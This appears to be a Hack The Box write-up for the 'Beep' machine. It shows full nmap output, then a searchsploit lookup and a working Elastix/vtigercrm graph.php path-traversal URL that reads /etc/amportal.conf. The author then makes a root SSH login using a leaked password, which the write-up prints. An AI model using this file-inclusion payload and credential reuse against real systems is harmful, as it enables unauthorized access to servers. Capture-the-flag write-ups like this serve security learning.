# nmap

enumerating the target machine with nmap,
```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-13 11:43 IST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:43
Completed NSE at 11:43, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:43
Completed NSE at 11:43, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:43
Completed NSE at 11:43, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 11:43
Completed Parallel DNS resolution of 1 host. at 11:43, 0.05s elapsed
Initiating SYN Stealth Scan at 11:43
Scanning 10.129.185.255 [20000 ports]
Discovered open port 110/tcp on 10.129.185.255
Discovered open port 22/tcp on 10.129.185.255
Discovered open port 3306/tcp on 10.129.185.255
Discovered open port 143/tcp on 10.129.185.255
Discovered open port 443/tcp on 10.129.185.255
Discovered open port 111/tcp on 10.129.185.255
Discovered open port 25/tcp on 10.129.185.255
Discovered open port 80/tcp on 10.129.185.255
Discovered open port 995/tcp on 10.129.185.255
Discovered open port 993/tcp on 10.129.185.255
Discovered open port 4445/tcp on 10.129.185.255
Discovered open port 943/tcp on 10.129.185.255
Discovered open port 4559/tcp on 10.129.185.255
SYN Stealth Scan Timing: About 38.04% done; ETC: 11:45 (0:00:50 remaining)
SYN Stealth Scan Timing: About 41.93% done; ETC: 11:46 (0:01:24 remaining)
SYN Stealth Scan Timing: About 45.98% done; ETC: 11:46 (0:01:47 remaining)
SYN Stealth Scan Timing: About 49.28% done; ETC: 11:47 (0:02:05 remaining)
SYN Stealth Scan Timing: About 59.31% done; ETC: 11:49 (0:02:21 remaining)
SYN Stealth Scan Timing: About 67.40% done; ETC: 11:49 (0:02:02 remaining)
Discovered open port 4190/tcp on 10.129.185.255
SYN Stealth Scan Timing: About 73.53% done; ETC: 11:50 (0:01:42 remaining)
SYN Stealth Scan Timing: About 80.10% done; ETC: 11:50 (0:01:22 remaining)
SYN Stealth Scan Timing: About 86.57% done; ETC: 11:51 (0:01:00 remaining)
Discovered open port 10000/tcp on 10.129.185.255
SYN Stealth Scan Timing: About 92.26% done; ETC: 11:51 (0:00:35 remaining)
Discovered open port 5038/tcp on 10.129.185.255
Completed SYN Stealth Scan at 11:51, 494.83s elapsed (20000 total ports)
Initiating Service scan at 11:51
Scanning 16 services on 10.129.185.255
Service scan Timing: About 50.00% done; ETC: 11:57 (0:02:45 remaining)
Completed Service scan at 11:54, 172.85s elapsed (16 services on 1 host)
Initiating OS detection (try #1) against 10.129.185.255
Retrying OS detection (try #2) against 10.129.185.255
Retrying OS detection (try #3) against 10.129.185.255
Retrying OS detection (try #4) against 10.129.185.255
Retrying OS detection (try #5) against 10.129.185.255
Initiating Traceroute at 11:55
Completed Traceroute at 11:55, 0.28s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 11:55
Completed Parallel DNS resolution of 2 hosts. at 11:55, 0.05s elapsed
NSE: Script scanning 10.129.185.255.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:55
NSE Timing: About 99.30% done; ETC: 11:55 (0:00:00 remaining)
NSE Timing: About 99.63% done; ETC: 11:56 (0:00:00 remaining)
NSE Timing: About 99.77% done; ETC: 11:56 (0:00:00 remaining)
Completed NSE at 11:57, 119.57s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:57
NSE Timing: About 86.36% done; ETC: 11:57 (0:00:05 remaining)
NSE Timing: About 90.15% done; ETC: 11:58 (0:00:07 remaining)
NSE Timing: About 94.70% done; ETC: 11:58 (0:00:05 remaining)
NSE Timing: About 94.70% done; ETC: 11:59 (0:00:07 remaining)
NSE Timing: About 95.45% done; ETC: 11:59 (0:00:07 remaining)
NSE Timing: About 95.45% done; ETC: 12:00 (0:00:09 remaining)
NSE Timing: About 97.73% done; ETC: 12:00 (0:00:05 remaining)
NSE Timing: About 98.48% done; ETC: 12:01 (0:00:04 remaining)
NSE Timing: About 98.48% done; ETC: 12:01 (0:00:04 remaining)
NSE Timing: About 99.24% done; ETC: 12:02 (0:00:02 remaining)
Completed NSE at 12:02, 319.49s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:02
Completed NSE at 12:02, 0.01s elapsed
Nmap scan report for 10.129.185.255
Host is up, received user-set (0.30s latency).
Scanned at 2021-08-13 11:43:41 IST for 1129s
Not shown: 19984 closed ports
Reason: 19984 resets
PORT      STATE SERVICE    REASON         VERSION
22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAI04jN+Sn7/9f2k+5UteAWn8KKj3FRGuF4LyeDmo/xxuHgSsdCjYuWtNS8m7stqgNH5edUu8vZ0pzF/quX5kphWg/UOz9weGeGyzde5lfb8epRlTQ2kfbP00l+kq9ztuWaXOsZQGcSR9iKE4lLRJhRCLYPaEbuxKnYz4WhAv4yD5AAAAFQDXgQ9BbvoxeDahe/ksAac2ECqflwAAAIEAiGdIue6mgTfdz/HikSp8DB6SkVh4xjpTTZE8L/HOVpTUYtFYKYj9eG0W1WYo+lGg6SveATlp3EE/7Y6BqdtJNm0RfR8kihoqSL0VzKT7myerJWmP2EavMRPjkbXw32fVBdCGjBqMgDl/QSEn2NNDu8OAyQUVBEHrE4xPGI825qgAAACANnqx2XdVmY8agjD7eFLmS+EovCIRz2+iE+5chaljGD/27OgpGcjdZNN+xm85PPFjUKJQuWmwMVTQRdza6TSp9vvQAgFh3bUtTV3dzDCuoR1D2Ybj9p/bMPnyw62jgBPxj5lVd27LTBi8IAH2fZnct7794Y3Ge+5r4Pm8Qbrpy68=
|   2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA4SXumrUtyO/pcRLwmvnF25NG/ozHsxSVNRmTwEf7AYubgpAo4aUuvhZXg5iymwTcZd6vm46Y+TX39NQV/yT6ilAEtLbrj1PLjJl+UTS8HDIKl6QgIb1b3vuEjbVjDj1LTq0Puzx52Es0/86WJNRVwh4c9vN8MtYteMb/dE2Azk0SQMtpBP+4Lul4kQrNwl/qjg+lQ7XE+NU7Va22dpEjLv/TjHAKImQu2EqPsC99sePp8PP5LdNbda6KHsSrZXnK9hqpxnwattPHT19D94NHVmMHfea9gXN3NCI3NVfDHQsxhqVtR/LiZzpbKHldFU0lfZYH1aTdBfxvMLrVhasZcw==
25/tcp    open  smtp?      syn-ack ttl 63
|_smtp-commands: Couldn't establish connection on port 25
80/tcp    open  http       syn-ack ttl 63 Apache httpd 2.2.3
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.129.185.255/
110/tcp   open  pop3?      syn-ack ttl 63
111/tcp   open  rpcbind    syn-ack ttl 63 2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            940/udp   status
|_  100024  1            943/tcp   status
143/tcp   open  imap?      syn-ack ttl 63
443/tcp   open  ssl/https? syn-ack ttl 63
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/localityName=SomeCity/emailAddress=root@localhost.localdomain/organizationalUnitName=SomeOrganizationalUnit
| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/localityName=SomeCity/emailAddress=root@localhost.localdomain/organizationalUnitName=SomeOrganizationalUnit
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2017-04-07T08:22:08
| Not valid after:  2018-04-07T08:22:08
| MD5:   621a 82b6 cf7e 1afa 5284 1c91 60c8 fbc8
| SHA-1: 800a c6e7 065e 1198 0187 c452 0d9b 18ef e557 a09f
| -----BEGIN CERTIFICATE-----
| MIIEDjCCA3egAwIBAgICfVUwDQYJKoZIhvcNAQEFBQAwgbsxCzAJBgNVBAYTAi0t
| MRIwEAYDVQQIEwlTb21lU3RhdGUxETAPBgNVBAcTCFNvbWVDaXR5MRkwFwYDVQQK
| ExBTb21lT3JnYW5pemF0aW9uMR8wHQYDVQQLExZTb21lT3JnYW5pemF0aW9uYWxV
| bml0MR4wHAYDVQQDExVsb2NhbGhvc3QubG9jYWxkb21haW4xKTAnBgkqhkiG9w0B
| CQEWGnJvb3RAbG9jYWxob3N0LmxvY2FsZG9tYWluMB4XDTE3MDQwNzA4MjIwOFoX
| DTE4MDQwNzA4MjIwOFowgbsxCzAJBgNVBAYTAi0tMRIwEAYDVQQIEwlTb21lU3Rh
| dGUxETAPBgNVBAcTCFNvbWVDaXR5MRkwFwYDVQQKExBTb21lT3JnYW5pemF0aW9u
| MR8wHQYDVQQLExZTb21lT3JnYW5pemF0aW9uYWxVbml0MR4wHAYDVQQDExVsb2Nh
| bGhvc3QubG9jYWxkb21haW4xKTAnBgkqhkiG9w0BCQEWGnJvb3RAbG9jYWxob3N0
| LmxvY2FsZG9tYWluMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC3e4HhLYPN
| gwJ4eKlW/UpmemPfK/a3mcafSqx/AJP34OC0Twj/cZNaqFPLOWfNjcq4mmiV++9a
| oJCkj4apDkyICI1emsrPaRdrlA/cCXcn3nupfOgcfpBV4vqNfqorEqpJCO7T4bcp
| Z6YHuxtRtP7gRJiE1ytAFP2jDvtvMqEWkwIDAQABo4IBHTCCARkwHQYDVR0OBBYE
| FL/OLJ7hJVedlL5Gk0fYvo6bZkqWMIHpBgNVHSMEgeEwgd6AFL/OLJ7hJVedlL5G
| k0fYvo6bZkqWoYHBpIG+MIG7MQswCQYDVQQGEwItLTESMBAGA1UECBMJU29tZVN0
| YXRlMREwDwYDVQQHEwhTb21lQ2l0eTEZMBcGA1UEChMQU29tZU9yZ2FuaXphdGlv
| bjEfMB0GA1UECxMWU29tZU9yZ2FuaXphdGlvbmFsVW5pdDEeMBwGA1UEAxMVbG9j
| YWxob3N0LmxvY2FsZG9tYWluMSkwJwYJKoZIhvcNAQkBFhpyb290QGxvY2FsaG9z
| dC5sb2NhbGRvbWFpboICfVUwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQUFAAOB
| gQA+ah2n+bomON94KgibPEVPpmW+8N6Sq3f4qDG54urTnPD39GrYHvMwA3B2ang9
| l3zta5tXYAVj22kiNM2si4bOMQsa6FZR4AEzWCq9tZS/vTCCRaT79mWj3bUvtDkV
| 2ScJ9I/7b4/cPHDOrAKdzdKxEE2oM0cwKxSnYBJk/4aJIw==
|_-----END CERTIFICATE-----
|_ssl-date: 2021-08-13T06:27:09+00:00; -3s from scanner time.
943/tcp   open  status     syn-ack ttl 63 1 (RPC #100024)
993/tcp   open  imaps?     syn-ack ttl 63
995/tcp   open  pop3s?     syn-ack ttl 63
3306/tcp  open  mysql?     syn-ack ttl 63
|_mysql-info: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
4190/tcp  open  sieve?     syn-ack ttl 63
4445/tcp  open  upnotifyp? syn-ack ttl 63
4559/tcp  open  hylafax?   syn-ack ttl 63
5038/tcp  open  asterisk   syn-ack ttl 63 Asterisk Call Manager 1.1
10000/tcp open  http       syn-ack ttl 63 MiniServ 1.570 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 3853C5D4B405765FAAE9C1D071AB7013
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/13%OT=22%CT=1%CU=37060%PV=Y%DS=2%DC=T%G=Y%TM=611611F
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=CD%GCD=1%ISR=D1%TI=Z%CI=Z%II=I%TS=A)OPS(O
OS:1=M54BST11NW7%O2=M54BST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST11N
OS:W7%O6=M54BST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16A0)ECN(R
OS:=Y%DF=Y%T=40%W=16D0%O=M54BNNSNW7%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%O=M54BST11NW7%RD=0%
OS:Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%
OS:A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%
OS:DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIP
OS:L=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.012 days (since Fri Aug 13 11:44:48 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=199 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: 127.0.0.1

Host script results:
|_clock-skew: -3s

TRACEROUTE (using port 199/tcp)
HOP RTT       ADDRESS
1   274.39 ms 10.10.16.1
2   274.58 ms 10.129.185.255

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:02
Completed NSE at 12:02, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:02
Completed NSE at 12:02, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:02
Completed NSE at 12:02, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1134.16 seconds
           Raw packets sent: 21715 (959.270KB) | Rcvd: 24225 (1.118MB)

```
we got a lot of ports open here. web server is on ports 80,443 heading to the webpage and going to advanced settings we can find an elastix login page.

# searchsploit

![search](/Images/searchsploit-elastix1.PNG)

As the clue in hack the box specifies LFI  I read the graph.php Local File Inclusion exploit and found this 

![lfi](/Images/lfi-beep.PNG)

I tried this lfi method and as

>https://10.129.185.255/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action

and got some results  back.

![result](/Images/result-beep-lfi.PNG)

as a wildguess  I tried logging into the machine via ssh  and faced some problem which then got resolved referring to [this link](https://unix.stackexchange.com/questions/340844/how-to-enable-diffie-hellman-group1-sha1-key-exchange-on-debian-8-0)

i tried logging in as root with differet passwords I got from the lfi inclusion and successful with this one - (jEhdIekWmdjE)

![shell](/Images/shell-beep.PNG)
